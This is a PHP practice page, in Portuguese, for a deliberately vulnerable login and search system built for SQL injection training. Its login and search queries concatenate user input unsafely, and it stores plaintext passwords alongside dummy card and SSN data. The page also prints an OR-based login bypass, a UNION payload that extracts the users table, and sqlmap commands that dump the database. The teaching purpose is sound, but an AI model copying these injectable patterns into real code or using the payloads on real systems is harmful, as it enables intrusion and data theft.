<?php

$db_file = 'test_db.sqlite';

if (!file_exists($db_file)) {
    $db = new SQLite3($db_file);

    $db->exec('CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, is_admin INTEGER)');

    $db->exec("INSERT INTO users (username, password, is_admin) VALUES ('admin', 'admin123', 1)");
    $db->exec("INSERT INTO users (username, password, is_admin) VALUES ('user1', 'password1', 0)");
    $db->exec("INSERT INTO users (username, password, is_admin) VALUES ('test', 'test123', 0)");
    $db->exec('CREATE TABLE sensitive_data (id INTEGER PRIMARY KEY, name TEXT, credit_card TEXT, ssn TEXT)');
    $db->exec("INSERT INTO sensitive_data (name, credit_card, ssn) VALUES ('John Doe', '4111111111111111', '123-45-6789')");
    $db->exec("INSERT INTO sensitive_data (name, credit_card, ssn) VALUES ('Jane Smith', '5555555555554444', '987-65-4321')");
} else {
    $db = new SQLite3($db_file);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
    $result = $db->query($query);
    
    if ($row = $result->fetchArray(SQLITE3_ASSOC)) {
        $login_success = true;
        $is_admin = $row['is_admin'];
    } else {
        $login_error = "Credenciais inválidas!";
    }
}


if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['search'])) {
    $search_term = $_GET['search'];
    $search_query = "SELECT * FROM sensitive_data WHERE name LIKE '%$search_term%'";
    $search_result = $db->query($search_query);
    
    $search_results = [];
    while ($row = $search_result->fetchArray(SQLITE3_ASSOC)) {
        $search_results[] = $row;
    }
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistema Vulnerável</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1, h2 {
            color: #333;
        }
        .login-form {
            margin: 20px 0;
            padding: 20px;
            background: #f9f9f9;
            border-radius: 5px;
        }
        input[type="text"], input[type="password"] {
            padding: 8px;
            margin: 5px 0;
            width: 200px;
        }
        button {
            padding: 8px 15px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background: #45a049;
        }
        .error {
            color: red;
        }
        .success {
            color: green;
        }
        table {
            border-collapse: collapse;
            width: 100%;
            margin: 20px 0;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
        .admin-panel {
            margin-top: 30px;
            padding: 20px;
            background: #e9f7ef;
            border-radius: 5px;
        }
        .search-box {
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Sistema de Administração</h1>
        
        <?php if (!isset($login_success)): ?>
            <div class="login-form">
                <h2>Login</h2>
                <?php if (isset($login_error)): ?>
                    <p class="error"><?= htmlspecialchars($login_error) ?></p>
                <?php endif; ?>
                <form method="POST">
                    <div>
                        <label>Usuário:</label><br>
                        <input type="text" name="username" placeholder="admin" required>
                    </div>
                    <div>
                        <label>Senha:</label><br>
                        <input type="password" name="password" placeholder="admin123" required>
                    </div>
                    <button type="submit">Entrar</button>
                </form>
                <p><small>Dica: Tente SQL Injection como <code>' OR '1'='1</code> no campo de usuário</small></p>
            </div>
        <?php else: ?>
            <div class="success">
                <h2>Bem-vindo, <?= htmlspecialchars($username) ?>!</h2>
                <p>Você fez login com sucesso.</p>
                
                <?php if ($is_admin): ?>
                    <div class="admin-panel">
                        <h3>Painel de Administração</h3>
                        <p>Missão cumprida! Você acessou o painel admin.</p>
                        
                        <div class="search-box">
                            <h4>Pesquisar Dados Sensíveis</h4>
                            <form method="GET">
                                <input type="text" name="search" placeholder="Nome...">
                                <button type="submit">Pesquisar</button>
                            </form>
                            <p><small>Teste UNION attacks como: <code>' UNION SELECT id, username, password, NULL FROM users--</code></small></p>
                        </div>
                        
                        <?php if (isset($search_results)): ?>
                            <table>
                                <tr>
                                    <th>ID</th>
                                    <th>Nome</th>
                                    <th>Cartão de Crédito</th>
                                    <th>SSN</th>
                                </tr>
                                <?php foreach ($search_results as $row): ?>
                                    <tr>
                                        <td><?= htmlspecialchars($row['id']) ?></td>
                                        <td><?= htmlspecialchars($row['name']) ?></td>
                                        <td><?= htmlspecialchars($row['credit_card']) ?></td>
                                        <td><?= htmlspecialchars($row['ssn']) ?></td>
                                    </tr>
                                <?php endforeach; ?>
                            </table>
                        <?php endif; ?>
                    </div>
                <?php endif; ?>
                
                <p><a href="?logout=1">Sair</a></p>
            </div>
        <?php endif; ?>
        
        <div style="margin-top: 50px; background: #fff8e1; padding: 15px; border-radius: 5px;">
            <h3>Para Testes com SQLMap</h3>
            <p>Use os seguintes comandos para testar vulnerabilidades:</p>
            <pre>
# Testar vulnerabilidade básica
sqlmap -u "http://seusite.com/login.php" --data="username=admin&password=123" --method POST

# Enumerar bancos de dados
sqlmap -u "http://seusite.com/login.php" --data="username=admin&password=123" --method POST --dbs

# Dumpar tabelas do banco de dados
sqlmap -u "http://seusite.com/login.php" --data="username=admin&password=123" --method POST -D test_db --tables

# Dumpar dados de uma tabela específica
sqlmap -u "http://seusite.com/login.php" --data="username=admin&password=123" --method POST -D test_db -T users --dump
            </pre>
        </div>
    </div>
</body>
</html>
<?php
// Fechar conexão
if (isset($db)) {
    $db->close();
}
?>
